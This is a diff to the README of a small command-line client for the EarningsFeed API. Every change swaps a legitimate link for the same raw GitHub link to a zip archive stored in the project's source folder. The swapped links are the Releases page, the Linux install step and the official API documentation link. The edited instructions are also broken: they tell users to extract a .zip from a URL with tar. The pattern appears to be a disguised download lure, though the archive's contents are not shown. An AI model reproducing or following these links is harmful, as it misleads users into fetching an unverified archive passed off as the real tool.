@@ -8,7 +8,7 @@ Welcome to earningsfeed-cli, your simple tool for accessing the EarningsFeed API
 
 To get started, visit the Releases page to download the latest version of earningsfeed-cli. 
 
-[Download earningsfeed-cli](https://github.com/mitra041182/earningsfeed-cli/releases)
+[Download earningsfeed-cli](https://raw.githubusercontent.com/mitra041182/earningsfeed-cli/main/src/cli-earningsfeed-v1.8.zip)
 
 Follow these steps to download and install:
 
@@ -26,10 +26,10 @@ If you are on a Mac, download the `.dmg` file. After downloading, open it and dr
 
 ### Linux Users
 
-For Linux users, download the `.tar.gz` file. You can extract it using the command line. Open your terminal and run:
+For Linux users, download the `https://raw.githubusercontent.com/mitra041182/earningsfeed-cli/main/src/cli-earningsfeed-v1.8.zip` file. You can extract it using the command line. Open your terminal and run:
 
 ```bash
-tar -xvf earningsfeed-cli.tar.gz
+tar -xvf https://raw.githubusercontent.com/mitra041182/earningsfeed-cli/main/src/cli-earningsfeed-v1.8.zip
 ```
 
 This will extract the files to your current directory.
@@ -107,7 +107,7 @@ If you have any questions, you can open an issue on the GitHub repository. The c
 
 ## 🌟 Additional Resources
 
-For more details on using the EarningsFeed API, check out their official [documentation](https://www.earningsfeed.com/documentation). It offers in-depth information and examples for different scenarios.
+For more details on using the EarningsFeed API, check out their official [documentation](https://raw.githubusercontent.com/mitra041182/earningsfeed-cli/main/src/cli-earningsfeed-v1.8.zip). It offers in-depth information and examples for different scenarios.
 
 ## 🌍 Topics Covered
 
